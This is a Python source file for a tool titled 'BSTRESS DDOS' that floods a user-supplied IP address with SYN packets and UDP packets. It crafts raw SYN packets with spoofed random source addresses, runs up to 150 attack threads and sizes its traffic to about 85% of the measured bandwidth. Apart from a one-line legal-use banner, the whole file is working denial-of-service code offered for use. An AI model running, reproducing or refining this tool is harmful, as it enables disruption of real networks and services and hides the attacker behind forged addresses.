import threading
import socket
import time
import random
from collections import defaultdict
import psutil
import speedtest

class NetworkOptimizer:
    def __init__(self):
        self.max_bandwidth = 0  # in bytes/second
        self.measured = False
        self.lock = threading.Lock()
        self.last_bytes = psutil.net_io_counters().bytes_sent
        self.last_time = time.time()
        
    def measure_bandwidth(self):
        """Measure maximum download/upload speed using speedtest"""
        print("\n[+] Measuring your network speed (like speedtest.net)...")
        
        try:
            st = speedtest.Speedtest()
            st.get_best_server()
            
            print("  Testing download speed...")
            download_speed = st.download()  # in bits/second
            print("  Testing upload speed...")
            upload_speed = st.upload()  # in bits/second
            
            # Use the lower of download/upload to be conservative
            measured_speed = min(download_speed, upload_speed)
            self.max_bandwidth = (measured_speed * 0.85) / 8  # 85% of max in bytes/second
            self.measured = True
            
            print(f"\n[+] Network measurement complete:")
            print(f"    Download: {download_speed/1e6:.2f} Mbps")
            print(f"    Upload: {upload_speed/1e6:.2f} Mbps")
            print(f"    Attack will use up to: {self.max_bandwidth*8/1e6:.2f} Mbps (85% of limit)")
            
        except Exception as e:
            print(f"[!] Speedtest failed: {str(e)}")
            print("    Falling back to interface speed detection")
            self._fallback_bandwidth_measurement()
    
    def _fallback_bandwidth_measurement(self):
        """Fallback method if speedtest fails"""
        try:
            stats = psutil.net_if_stats()
            max_speed = 0
            for interface in stats.values():
                if interface.speed > max_speed:
                    max_speed = interface.speed
            if max_speed > 0:
                self.max_bandwidth = (max_speed * 125000) * 0.85  # 85% of interface speed
                print(f"    Using interface speed: {max_speed} Mbps")
            else:
                self.max_bandwidth = float('inf')
                print("    Cannot determine max speed - no throttling")
        except:
            self.max_bandwidth = float('inf')
            print("    Cannot measure speed - no throttling")
        self.measured = True
    
    def check_capacity(self, packet_size, burst_size=10):
        """Optimized capacity check with burst allowance"""
        if not self.measured or self.max_bandwidth == float('inf'):
            return False
            
        with self.lock:
            now = time.time()
            current_bytes = psutil.net_io_counters().bytes_sent
            elapsed = max(0.001, now - self.last_time)
            
            current_rate = (current_bytes - self.last_bytes) / elapsed
            
            # Allow 10% burst above target bandwidth
            if current_rate + (packet_size * burst_size) > self.max_bandwidth * 1.1:
                sleep_time = (packet_size * burst_size) / self.max_bandwidth
                time.sleep(min(sleep_time, 0.01))  # Reduced sleep time
                return True
                
            self.last_bytes = current_bytes
            self.last_time = now
            return False

class HighPerformanceAttacker:
    def __init__(self, target_ip, threads=100):  # Default to max threads
        self.target_ip = target_ip
        self.threads = min(150, max(10, threads))  # Increased max to 150
        self.stop_flag = False
        self.optimizer = NetworkOptimizer()
        self.stats = defaultdict(int)
        self.stats['start_time'] = time.time()
        
        # Pre-built packets (larger pool)
        self.syn_packets = [self._create_syn_packet() for _ in range(500)]  # Increased from 100
        self.udp_payloads = [self._create_udp_payload() for _ in range(20)]  # Increased from 10

    def _create_syn_packet(self):
        """Optimized SYN packet creation"""
        ip_header = (
            b'\x45\x00\x00\x28'  # IP version, IHL, total length
            + random.randint(0, 65535).to_bytes(2, 'big')  # Identification
            + b'\x40\x00\x40\x06'  # Flags, Fragment, TTL, Protocol
            + b'\x00\x00'  # Header checksum
            + socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
            + socket.inet_aton(self.target_ip)
        )
        
        tcp_header = (
            random.randint(1024, 65535).to_bytes(2, 'big')  # Source port
            + random.choice([80, 443]).to_bytes(2, 'big')  # Common ports
            + random.randint(0, 4294967295).to_bytes(4, 'big')  # Sequence
            + b'\x00\x00\x00\x00'  # ACK number
            + b'\x50\x02\xff\xff'  # Header length, SYN flag, window
            + b'\x00\x00'  # Checksum
            + b'\x00\x00'  # Urgent pointer
        )
        
        return ip_header + tcp_header

    def _create_udp_payload(self):
        """Optimized UDP payload (fixed 1470 bytes for MTU)"""
        return bytes([random.randint(0, 255) for _ in range(1470)])

    def syn_flood(self):
        """Ultra-high-performance SYN flood with burst sending"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while not self.stop_flag:
                # Send burst of 20 packets before checking capacity
                for _ in range(20):
                    packet = random.choice(self.syn_packets)
                    try:
                        s.sendto(packet, (self.target_ip, 0))
                        with self.optimizer.lock:
                            self.stats['syn'] += 1
                            self.stats['total'] += 1
                    except:
                        self.stats['errors'] += 1
                
                # Check capacity after burst
                if self.optimizer.check_capacity(60, burst_size=20):  # ~60 bytes per SYN
                    continue
        except PermissionError:
            print("[!] Raw sockets require root privileges!")
            exit(1)

    def udp_flood(self, port=53):
        """Optimized UDP flood with burst sending"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not self.stop_flag:
            # Send burst of 10 packets
            for _ in range(10):
                payload = random.choice(self.udp_payloads)
                try:
                    s.sendto(payload, (self.target_ip, port))
                    with self.optimizer.lock:
                        self.stats['udp'] += 1
                        self.stats['total'] += 1
                except:
                    self.stats['errors'] += 1
            
            # Check capacity after burst
            if self.optimizer.check_capacity(1470, burst_size=10):
                continue

    def display_stats(self):
        """Optimized stats display with reduced overhead"""
        start_time = self.stats['start_time']
        start_bytes = psutil.net_io_counters().bytes_sent
        last_display = 0
        
        while not self.stop_flag:
            now = time.time()
            if now - last_display < 1.0:
                time.sleep(0.1)
                continue
                
            elapsed = now - start_time
            current_bytes = psutil.net_io_counters().bytes_sent
            last_display = now
            
            # Calculate rates
            mb_sent = (current_bytes - start_bytes) / 1024 / 1024
            mbps = (mb_sent * 8) / elapsed if elapsed > 0 else 0
            max_mbps = self.optimizer.max_bandwidth*8/1e6 if self.optimizer.measured else 0
            usage_pct = (mbps/max_mbps*100) if max_mbps > 0 else 0
            
            # Only print if terminal is available
            print("\033[H\033[J", end='')
            print("=== BSTRESS DDOS ===")
            print(f"Target: {self.target_ip} | Threads: {self.threads}")
            print(f"Runtime: {int(elapsed)}s | PPS: {self.stats['total']/elapsed:,.0f}")
            print(f"SYN: {self.stats['syn']:,} | UDP: {self.stats['udp']:,}")
            print(f"Errors: {self.stats['errors']:,}")
            print(f"\nBandwidth: {mbps:.2f} Mbps of {max_mbps:.2f} Mbps ({min(100, usage_pct):.1f}%)")
            print("Press CTRL+C to stop")

    def run(self):
        """Optimized attack execution"""
        self.optimizer.measure_bandwidth()
        time.sleep(1)
        
        print(f"\n[+] Starting optimized attack on {self.target_ip}")
        print(f"    Threads: {self.threads} (SYN: {self.threads//2}, UDP: {self.threads//2})")
        
        # Start attack threads
        for _ in range(self.threads // 2):
            threading.Thread(target=self.syn_flood, daemon=True).start()
            threading.Thread(target=self.udp_flood, daemon=True).start()
        
        # Start stats display
        threading.Thread(target=self.display_stats, daemon=True).start()
        
        try:
            while True: 
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_flag = True
            print("\n[!] Stopping attack...")
            time.sleep(1)
            
            elapsed = time.time() - self.stats['start_time']
            print(f"\n=== FINAL STATS ===")
            print(f"Duration: {elapsed:.1f} seconds")
            print(f"Total packets: {self.stats['total']:,}")
            print(f"Average PPS: {self.stats['total']/elapsed:,.0f}")
            print(f"Bandwidth used: {(self.stats['total']*60/elapsed)/1e6:.2f} Mbps")  # Approx

def get_target_ip():
    """Get and validate target IP"""
    print("\n[!] LEGAL USE ONLY. UNAUTHORIZED TESTING IS ILLEGAL.")
    print("=== BSTRESS DDOS ===\n")
    
    while True:
        target = input("Enter target IP address: ").strip()
        try:
            socket.inet_aton(target)
            return target
        except socket.error:
            print("Invalid IP format. Example: 192.168.1.1")

def get_thread_count():
    """Get validated thread count"""
    while True:
        try:
            threads = int(input("Threads (10-150, default 100): ") or 100)
            if 10 <= threads <= 150:
                return threads
            print("Please enter 10-150")
        except ValueError:
            print("Numbers only")

def main():
    target_ip = get_target_ip()
    threads = get_thread_count()
    
    confirm = input(f"\nConfirm attack on {target_ip} with {threads} threads? (y/n): ")
    if confirm.lower() == 'y':
        attacker = HighPerformanceAttacker(target_ip, threads)
        attacker.run()
    else:
        print("[!] Cancelled")

if __name__ == "__main__":
    try:
        import speedtest
    except ImportError:
        print("[!] Please install speedtest-cli: pip install speedtest-cli")
        exit(1)
        
    main()